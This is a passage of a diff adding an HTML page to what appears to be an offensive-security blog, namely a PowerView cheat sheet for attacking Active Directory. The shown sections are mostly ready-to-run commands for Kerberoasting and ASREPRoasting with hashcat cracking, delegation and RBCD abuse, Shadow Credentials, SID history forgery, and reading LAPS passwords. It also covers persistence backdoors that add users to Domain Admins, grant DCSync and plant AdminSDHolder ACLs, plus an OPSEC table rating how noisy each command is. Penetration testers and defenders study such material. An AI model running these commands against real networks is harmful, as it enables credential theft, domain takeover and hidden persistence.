+Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Out-File spntix.txt
+</code></pre>
+<p>Crack: <code>hashcat -m 13100 spntix.txt wordlist.txt</code> (RC4) or <code>-m 19600</code> (AES256).</p>
+<h3 id="asreproasting">ASREPRoasting</h3>
+<p>Pre-auth disabled — no credentials needed to get the hash.</p>
+<pre><code class="lang-powershell">Get-DomainUser -PreauthNotRequired | Select samaccountname
+</code></pre>
+<p>Get hashes: <code>Rubeus.exe asreproast /format:hashcat /outfile:asrephashes.txt</code></p>
+<p>Crack: <code>hashcat -m 18200 asrephashes.txt wordlist.txt</code></p>
+<h2 id="delegation">DELEGATION</h2>
+<h3 id="unconstrained-delegation">Unconstrained Delegation</h3>
+<p>Compromising one of these allows capturing TGTs from any user that authenticates. Force DC authentication via Print Spooler or PetitPotam to capture a DC TGT.</p>
+<pre><code class="lang-powershell">Get-DomainComputer -Unconstrained | Select dnshostname,useraccountcontrol
+Get-DomainUser -AllowDelegation -AdminCount | Select samaccountname
+</code></pre>
+<h3 id="constrained-delegation">Constrained Delegation</h3>
+<p>Can impersonate any user toward the listed services via S4U2Proxy.</p>
+<pre><code class="lang-powershell">Get-DomainComputer -TrustedToAuth | Select dnshostname,msds-allowedtodelegateto
+Get-DomainUser -TrustedToAuth | Select samaccountname,msds-allowedtodelegateto
+</code></pre>
+<h3 id="rbcd-find-targets">RBCD — Find Targets</h3>
+<p><code>GenericWrite</code> or <code>GenericAll</code> over a computer object is enough to configure RBCD.</p>
+<pre><code class="lang-powershell">Get-DomainComputer | Where-Object {
+    $_.&quot;msds-allowedtoactonbehalfofotheridentity&quot; -ne $null
+} | Select dnshostname,msds-allowedtoactonbehalfofotheridentity
+
+Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
+    $_.ActiveDirectoryRights -match &quot;GenericWrite|GenericAll&quot; -and
+    $_.ObjectDN -match &quot;CN=.*,CN=Computers&quot;
+}
+</code></pre>
+<h3 id="rbcd-configure">RBCD — Configure</h3>
+<p>Configure after confirming write access on the target object.</p>
+<pre><code class="lang-powershell">$sid = Get-DomainComputer -Identity attackerPC | Select-Object -ExpandProperty objectsid
+Set-DomainObject -Identity targetPC -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sid}
+</code></pre>
+<h3 id="shadow-credentials">Shadow Credentials</h3>
+<p>Requires <code>WriteProperty</code> on <code>msDS-KeyCredentialLink</code>. Add the key with Whisker, then use Rubeus with PKINIT to get a TGT without knowing the password.</p>
+<pre><code class="lang-powershell">Get-DomainObject -Identity targetuser -Properties msDS-KeyCredentialLink
+
+Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
+    $_.ObjectAceType -match &quot;msDS-KeyCredentialLink&quot; -and
+    $_.ActiveDirectoryRights -match &quot;WriteProperty|GenericWrite|GenericAll&quot;
+}
+</code></pre>
+<p>Full flow: <code>Whisker.exe add /target:targetuser</code> → PFX cert → <code>Rubeus.exe asktgt /certificate:cert.pfx</code></p>
+<h2 id="trusts">TRUSTS</h2>
+<h3 id="map-trusts">Map Trusts</h3>
+<p>Direction and type determine the attack path. Always map before attempting cross-domain lateral movement.</p>
+<pre><code class="lang-powershell">Get-DomainTrust
+Get-DomainTrust -Domain zirov.local
+Get-DomainTrust -Recurse
+Get-ForestTrust
+Get-ForestTrust -Forest external.local
+Get-NetForestDomain -Forest zirov.local | Get-NetDomainController
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Direction</th>
+<th>Implication</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Parent-Child</td>
+<td>Bidirectional transitive</td>
+<td>DA in child → SID history to parent</td>
+</tr>
+<tr>
+<td>Forest</td>
+<td>Usually one-way</td>
+<td>Check selective auth + SID filtering</td>
+</tr>
+<tr>
+<td>External</td>
+<td>One-way non-transitive</td>
+<td>Limited lateral movement</td>
+</tr>
+<tr>
+<td>Shortcut</td>
+<td>Bidirectional</td>
+<td>Speeds up auth between child domains</td>
+</tr>
+</tbody>
+</table>
+<h3 id="sid-filtering-selective-authentication">SID Filtering &amp; Selective Authentication</h3>
+<p><code>TrustAttributes=4</code> means filtering is disabled — SID history abuse is possible. <code>TrustAttributes=8</code> indicates selective authentication — only specific users can authenticate.</p>
+<pre><code class="lang-powershell">Get-DomainTrust | Select SourceName,TargetName,TrustAttributes,TrustDirection
+Find-ForeignGroup -Verbose
+Find-ForeignUser -Verbose
+</code></pre>
+<h3 id="sid-history-abuse">SID History Abuse</h3>
+<p>If you have DA in a child domain and SID filtering is off: get the Enterprise Admins SID from the root domain, forge a Golden Ticket with that SID in the SIDHistory field, and access root domain resources.</p>
+<pre><code class="lang-powershell">Get-DomainGroup -Identity &quot;Enterprise Admins&quot; -Domain zirov.local | Select objectsid
+</code></pre>
+<h2 id="specialized-targets">SPECIALIZED TARGETS</h2>
+<h3 id="laps">LAPS</h3>
+<p>Identify who can read local administrator passwords — direct path to lateral movement.</p>
+<pre><code class="lang-powershell">Find-AdmPwdExtendedRights -Identity &quot;Workstations&quot;
+Find-LAPSDelegatedGroups
+Get-DomainComputer -Identity workstation01 -Properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
+Get-DomainComputer | Where-Object { $_.&quot;ms-mcs-admpwd&quot; -ne $null }
+</code></pre>
+<h3 id="gmsa">gMSA</h3>
+<p>Find gMSA accounts and check who can retrieve the managed password.</p>
+<pre><code class="lang-powershell">Get-DomainObject -LDAPFilter &quot;(objectClass=msDS-GroupManagedServiceAccount)&quot;
+Get-DomainObject -Identity &quot;gmsaaccount$&quot; -Properties msDS-GroupMSAMembership
+</code></pre>
+<h3 id="adcs-certificate-services">ADCS — Certificate Services</h3>
+<p>PowerView alone doesn't fully enumerate ADCS. Use Certify (Windows) or Certipy (Linux) for complete ESC detection.</p>
+<pre><code class="lang-powershell">Get-DomainObject -SearchBase &quot;CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=zirov,DC=local&quot; -LDAPFilter &quot;(objectclass=pKIEnrollmentService)&quot;
+</code></pre>
+<p>Windows — full scan of CAs and vulnerable templates:</p>
+<pre><code class="lang-powershell">.\Certify.exe cas
+.\Certify.exe find /vulnerable
+</code></pre>
+<p>Linux:</p>
+<pre><code class="lang-bash">certipy find -u genarov69@zirov.local -p 'P@ssw0rd' -dc-ip 10.10.10.1 -vulnerable
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>ESC</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ESC1</td>
+<td>Requestor supplies SAN → enroll as any user</td>
+</tr>
+<tr>
+<td>ESC4</td>
+<td>Write access to template → modify for ESC1</td>
+</tr>
+<tr>
+<td>ESC8</td>
+<td>NTLM relay to AD CS HTTP endpoint</td>
+</tr>
+</tbody>
+</table>
+<h3 id="exchange">Exchange</h3>
+<p>Membership in Organization Management frequently leads to DCSync via the Exchange Windows Permissions group.</p>
+<pre><code class="lang-powershell">Get-DomainGroup | Where-Object { $_.name -match &quot;Exchange&quot; }
+Get-DomainGroupMember -Identity &quot;Organization Management&quot; -Recurse
+Get-DomainGroupMember -Identity &quot;Exchange Windows Permissions&quot;
+Get-DomainComputer | Where-Object { $_.serviceprincipalname -match &quot;exchangeMDB|MSExchangeMTA&quot; }
+</code></pre>
+<h3 id="sccm-mecm">SCCM / MECM</h3>
+<p>Site servers often have highly privileged service accounts. NAA credentials are sometimes stored in plaintext in WMI.</p>
+<pre><code class="lang-powershell">Get-DomainGroup | Where-Object { $_.name -match &quot;SCCM|SMS|ConfigMgr&quot; }
+Get-DomainComputer | Where-Object { $_.dnshostname -match &quot;sccm|sms|cm&quot; }
+</code></pre>
+<h3 id="adminsdholder">AdminSDHolder</h3>
+<p>Objects with <code>admincount=1</code> have their ACL reset every 60 min by SDProp. A backdoor here survives DA password changes.</p>
+<pre><code class="lang-powershell">Get-DomainUser -AdminCount | Select samaccountname,admincount
+Get-DomainComputer -AdminCount | Select dnshostname,admincount
+</code></pre>
+<h2 id="persistence-backdoors">PERSISTENCE &amp; BACKDOORS</h2>
+<h3 id="group-membership-abuse">Group Membership Abuse</h3>
+<p>Requires <code>GenericAll</code> or <code>WriteProperty</code> on the group object. Always verify the add succeeded.</p>
+<pre><code class="lang-powershell">Add-DomainGroupMember -Identity &quot;Domain Admins&quot; -Members &quot;genarov69&quot;
+Get-DomainGroupMember -Identity &quot;Domain Admins&quot; | Select MemberName
+</code></pre>
+<h3 id="user-object-manipulation">User Object Manipulation</h3>
+<p>Password reset requires <code>ForceChangePassword</code> or <code>GenericAll</code>. SPN and preauth abuse require <code>WriteProperty</code>. Always clean up after cracking.</p>
+<pre><code class="lang-powershell">Set-DomainUserPassword -Identity genarov69 -AccountPassword (ConvertTo-SecureString &quot;N3wP@ss!&quot; -AsPlainText -Force)
+Set-DomainObject -Identity genarov69 -Set @{serviceprincipalname=&quot;fake/zirov&quot;}
+Set-DomainObject -Identity genarov69 -Clear serviceprincipalname
+Set-DomainObject -Identity genarov69 -XOR @{useraccountcontrol=4194304}
+</code></pre>
+<h3 id="acl-backdoors">ACL Backdoors</h3>
+<p>DCSync without DA — grants <code>DS-Replication-Get-Changes</code> + <code>DS-Replication-Get-Changes-All</code>. AdminSDHolder survives SDProp resets.</p>
+<pre><code class="lang-powershell">Add-DomainObjectAcl -TargetIdentity &quot;DC=zirov,DC=local&quot; -PrincipalIdentity genarov69 -Rights DCSync
+Add-DomainObjectAcl -TargetIdentity &quot;Domain Admins&quot; -PrincipalIdentity genarov69 -Rights All
+Add-DomainObjectAcl -TargetIdentity &quot;Domain Admins&quot; -PrincipalIdentity genarov69 -Rights WriteMembers
+Add-DomainObjectAcl -TargetIdentity &quot;CN=AdminSDHolder,CN=System,DC=zirov,DC=local&quot; -PrincipalIdentity genarov69 -Rights All
+</code></pre>
+<h3 id="alternate-credentials">Alternate Credentials</h3>
+<p>All PowerView functions accept <code>-Credential</code>. Useful when you have creds but aren't running as that user.</p>
+<pre><code class="lang-powershell">$pass = ConvertTo-SecureString &quot;P@ssw0rd!&quot; -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential(&quot;zirov\genarov69&quot;, $pass)
+Get-Domain -Credential $cred
+Get-DomainUser -Credential $cred
+Invoke-UserHunter -Credential $cred
+</code></pre>
+<p>Full process impersonation:</p>
+<pre><code class="lang-powershell">runas /netonly /user:zirov\genarov69 powershell.exe
+</code></pre>
+<h2 id="bloodhound-session-hunting-recipes">BLOODHOUND, SESSION HUNTING &amp; RECIPES</h2>
+<h3 id="session-hunting">Session Hunting</h3>
+<p><code>Invoke-UserHunter</code> sweeps all hosts via NetSessionEnum and NetWkstaUserEnum — very noisy. Use <code>-Stealth</code> first (DCs + file servers only), then <code>-CheckAccess</code> to confirm local admin before moving laterally.</p>
+<pre><code class="lang-powershell">Invoke-UserHunter -Stealth -GroupName &quot;Domain Admins&quot;
+Invoke-UserHunter -GroupName &quot;Domain Admins&quot; -CheckAccess
+Invoke-UserHunter -UserName &quot;genarov69&quot;
+</code></pre>
+<h3 id="sharphound">SharpHound</h3>
+<p>Preferred collector for modern environments. <code>DCOnly</code> is quiet (LDAP only). <code>All</code> is comprehensive but very noisy.</p>
+<pre><code class="lang-powershell">.\SharpHound.exe -c DCOnly
+.\SharpHound.exe -c All
+.\SharpHound.exe -c All --domain zirov.local --ldapusername genarov69 --ldappassword &quot;P@ssw0rd!&quot;
+.\SharpHound.exe -c All --loop --loopduration 00:30:00 --loopinterval 00:05:00
+</code></pre>
+<h3 id="invoke-bloodhound">Invoke-BloodHound</h3>
+<p>PowerShell alternative when SharpHound isn't viable.</p>
+<pre><code class="lang-powershell">Invoke-BloodHound -CollectionMethod DCOnly
+Invoke-BloodHound -CollectionMethod All
+Invoke-BloodHound -CollectionMethod All -Domain zirov.local -LDAPUser genarov69 -LDAPPass &quot;P@ssw0rd!&quot;
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Noise</th>
+<th>When to Use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>DCOnly</code></td>
+<td>Low</td>
+<td>Initial recon, AV environments</td>
+</tr>
+<tr>
+<td><code>Session</code></td>
+<td>High</td>
+<td>Only for DA session hunting</td>
+</tr>
+<tr>
+<td><code>All</code></td>
+<td>High</td>
+<td>When noise is acceptable</td>
+</tr>
+<tr>
+<td><code>Loop</code></td>
+<td>Very High</td>
+<td>Capture transient DA sessions</td>
+</tr>
+</tbody>
+</table>
+<p>Priority edges in BloodHound: <code>GenericAll</code>, <code>GenericWrite</code>, <code>WriteDacl</code>, <code>Owns</code>, <code>ForceChangePassword</code>, <code>AllowedToDelegate</code>, <code>HasSIDHistory</code>.</p>
+<h3 id="recipe-find-dangerous-acls">Recipe — Find Dangerous ACLs</h3>
+<p>Exclude built-in trustees to reduce noise and focus on real paths.</p>
+<pre><code class="lang-powershell">Invoke-ACLScanner -ResolveGUIDs | Where-Object {
+    $_.IdentityReferenceName -notmatch &quot;SYSTEM|Domain Admins|Enterprise Admins|Administrators&quot;
+} | Select IdentityReferenceName,ObjectDN,ActiveDirectoryRights | Sort ObjectDN
+</code></pre>
+<h3 id="recipe-find-rbcd-targets">Recipe — Find RBCD Targets</h3>
+<p>Computers you have write over — enough to configure RBCD and impersonate DA.</p>
+<pre><code class="lang-powershell">Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
+    $_.ActiveDirectoryRights -match &quot;GenericWrite|GenericAll&quot; -and
+    $_.ObjectAceType -eq &quot;All&quot; -and
+    $_.ObjectDN -match &quot;CN=.*,CN=Computers&quot;
+}
+</code></pre>
+<h3 id="recipe-find-shadow-credential-targets">Recipe — Find Shadow Credential Targets</h3>
+<p>Objects you have write over on <code>msDS-KeyCredentialLink</code>.</p>
+<pre><code class="lang-powershell">Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
+    $_.ObjectAceType -match &quot;msDS-KeyCredentialLink&quot; -and
+    $_.ActiveDirectoryRights -match &quot;WriteProperty|GenericWrite|GenericAll&quot;
+}
+</code></pre>
+<p>Flow: <code>Whisker.exe add /target:targetuser</code> → PFX → <code>Rubeus.exe asktgt /certificate:cert.pfx</code></p>
+<h3 id="recipe-find-cross-forest-escalation">Recipe — Find Cross-Forest Escalation</h3>
+<p>Map all forest trusts and look for foreign users/groups in the local domain.</p>
+<pre><code class="lang-powershell">Get-ForestTrust
+Find-ForeignGroup -Verbose
+Find-ForeignUser -Verbose
+Get-DomainTrust | Where-Object { $_.TrustType -eq &quot;Forest&quot; } | Select SourceName,TargetName,TrustDirection,TrustAttributes
+</code></pre>
+<h3 id="recipe-full-da-path-discovery">Recipe — Full DA Path Discovery</h3>
+<p>Run in order — from least to most noisy.</p>
+<pre><code class="lang-powershell">Get-DomainTrust; Get-ForestTrust
+Invoke-ACLScanner -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match &quot;GenericAll|WriteDacl|GenericWrite&quot; }
+Get-DomainComputer -Unconstrained | Select dnshostname
+Get-DomainComputer -TrustedToAuth | Select dnshostname,msds-allowedtodelegateto
+Get-DomainUser -TrustedToAuth | Select samaccountname,msds-allowedtodelegateto
+Invoke-UserHunter -Stealth -CheckAccess
+</code></pre>
+<h3 id="opsec-reference">OPSEC Reference</h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Noise</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Get-DomainUser</code></td>
+<td>Low</td>
+<td>LDAP only</td>
+</tr>
+<tr>
+<td><code>Get-DomainComputer</code></td>
+<td>Low</td>
+<td>LDAP only</td>
+</tr>
+<tr>
+<td><code>Get-DomainObjectAcl</code></td>
+<td>Low</td>
+<td>LDAP only</td>
+</tr>
+<tr>
+<td><code>Get-DomainSPNTicket</code></td>
+<td>Low</td>
+<td>KDC request only</td>
+</tr>
+<tr>
+<td><code>SharpHound -c DCOnly</code></td>
+<td>Low</td>
+<td>LDAP only, no host contact</td>
+</tr>
+<tr>
+<td><code>Invoke-ACLScanner</code></td>
+<td>Medium</td>
+<td>Large LDAP sweep</td>
+</tr>
+<tr>
+<td><code>Get-NetLoggedon</code></td>
+<td>Medium</td>
+<td>Local admin + RPC per host</td>
+</tr>
+<tr>
+<td><code>Invoke-UserHunter -Stealth</code></td>
+<td>Medium</td>
+<td>DCs + file servers only</td>
+</tr>
+<tr>
+<td><code>Invoke-ShareFinder</code></td>
+<td>High</td>
+<td>SMB sweep across domain</td>
+</tr>
+<tr>
+<td><code>Invoke-UserHunter</code></td>
+<td>High</td>
+<td>Touches all hosts</td>
+</tr>
+<tr>
+<td><code>Find-LocalAdminAccess</code></td>
+<td>Very High</td>
+<td>SMB/RPC to all hosts</td>
+</tr>
+<tr>
+<td><code>SharpHound -c All</code></td>
+<td>Very High</td>
+<td>Session + host enumeration</td>
+</tr>
+<tr>
+<td><code>SharpHound --Loop</code></td>
+<td>Very High</td>
+<td>Continuous noise</td>
+</tr>
+</tbody>
+</table>
+<h2 id="references">REFERENCES</h2>
+<ul>
+<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView — PowerSploit</a></li>
+<li><a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">HarmJ0y PowerView Tricks</a></li>
+<li><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse">ired.team — AD Enumeration</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md">PayloadsAllTheThings — Active Directory</a></li>
+<li><a href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet">S1ckB0y1337 — AD Cheatsheet</a></li>
+<li><a href="https://specterops.io/assets/resources/Certified_Pre-Owned.pdf">SpecterOps — Certified Pre-Owned</a></li>
+<li><a href="https://github.com/GhostPack/Certify">Certify</a> / <a href="https://github.com/ly4k/Certipy">Certipy</a></li>
+<li><a href="https://github.com/eladshamir/Whisker">Whisker — Shadow Credentials</a></li>
+<li><a href="https://github.com/BloodHoundAD/SharpHound">SharpHound</a></li>
+</ul>
+      </div>
+    </article>
+    <aside class="col-sidebar"></aside>
+  </main>
+  <footer class="site-footer">
+    <div class="footer-main">
+      <div class="footer-col">
+        <div class="footer-col-label">Zirov</div>
+        <div class="footer-brand"><svg style="width:22px;height:23px;flex-shrink:0;display:block;" viewBox="-0.5 -0.5 262 270" xmlns="http://www.w3.org/2000/svg"><path fill="#c82525" d="M -0.5,-0.5 C 86.8333,-0.5 174.167,-0.5 261.5,-0.5C 261.5,89.5 261.5,179.5 261.5,269.5C 174.167,269.5 86.8333,269.5 -0.5,269.5C -0.5,179.5 -0.5,89.5 -0.5,-0.5 Z"/><path fill="#f9f8f8" d="M 121.5,149.5 C 120.244,149.461 119.244,149.961 118.5,151C 143.831,151.5 169.164,151.667 194.5,151.5C 194.5,159.167 194.5,166.833 194.5,174.5C 151.167,174.5 107.833,174.5 64.5,174.5C 64.169,166.472 64.5023,158.472 65.5,150.5C 90.1104,140.298 114.777,130.298 139.5,120.5C 140.289,120.217 140.956,119.717 141.5,119C 115.835,118.5 90.1688,118.333 64.5,118.5C 64.5,110.833 64.5,103.167 64.5,95.5C 108.167,95.5 151.833,95.5 195.5,95.5C 195.831,103.528 195.498,111.528 194.5,119.5C 170.143,129.506 145.809,139.506 121.5,149.5 Z"/></svg><span class="footer-brand-text">Ziro<em>v</em></span></div>
+        <p class="footer-tagline">CTF writeups · malware analysis<br>offensive research · built for the curious mind.</p>
+        <a href="https://buymeacoffee.com/zirov" target="_blank" rel="noopener noreferrer" class="footer-coffee">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8h1a4 4 0 0 1 0 8h-1"/><path d="M2 8h16v9a4 4 0 0 1-4 4H6a4 4 0 0 1-4-4V8z"/><line x1="6" y1="1" x2="6" y2="4"/><line x1="10" y1="1" x2="10" y2="4"/><line x1="14" y1="1" x2="14" y2="4"/></svg>
+          <div class="footer-coffee-text"><span class="footer-coffee-label">Support the work</span><span class="footer-coffee-sub">Buy me a coffee</span></div>
+          <svg class="footer-coffee-arr" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><polyline points="9 18 15 12 9 6"/></svg>
+        </a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-label">Explore</div>
+        <nav class="footer-links">
+          <a href="/#writeups"  class="footer-link"><span class="footer-link-arr">›</span>Writeups</a>
+          <a href="/#research"  class="footer-link"><span class="footer-link-arr">›</span>Research</a>
+          <a href="/#scripting" class="footer-link"><span class="footer-link-arr">›</span>Scripting</a>
+          <a href="/#notes"     class="footer-link"><span class="footer-link-arr">›</span>Notes</a>
+        </nav>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-label">Connect</div>
+        <div class="footer-socials">
+          <a href="https://github.com/z1rov" target="_blank" rel="noopener" class="footer-soc"><svg fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"/></svg> GitHub</a>
+          <a href="https://www.linkedin.com/in/fabian-g-huamani" target="_blank" rel="noopener" class="footer-soc"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452z"/></svg> LinkedIn</a>
+          <a href="https://profile.hackthebox.com/profile/019c52fc-d8cf-7339-9385-c0d96f6f7efb" target="_blank" rel="noopener" class="footer-soc"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M11.996 0a1.119 1.119 0 0 0-.057.003.9.9 0 0 0-.236.05.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77v11.111a.889.889 0 0 0 .47.784l9.598 5.541.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.026.01.001.011.003.016.004a.93.93 0 0 0 .296.015.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.026l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.026c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .726l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.726l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.526 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.261.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532a.42.42 0 0 1-.208.362l-6.526 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z"/></svg> HackTheBox</a>
+          <a href="https://discord.gg/PBq8YBsq" target="_blank" rel="noopener" class="footer-soc"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.002.022.015.043.031.051a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/></svg> Discord</a>
+        </div>
+      </div>
+    </div>
+    <div class="footer-bar">
+      <span class="footer-copy">© 2026 <em>Zirov</em> · All rights reserved.</span>
+      <div class="footer-bar-links"><a href="#" class="footer-bar-link">Privacy</a><a href="#" class="footer-bar-link">RSS</a></div>
+    </div>
+  </footer>
+  <script src="/js/app.js"></script>
+  <script src="/js/post.js"></script>
+  <script src="/js/search.js"></script>
+  <script src="/js/analytics.js"></script>
+</body>
+</html>
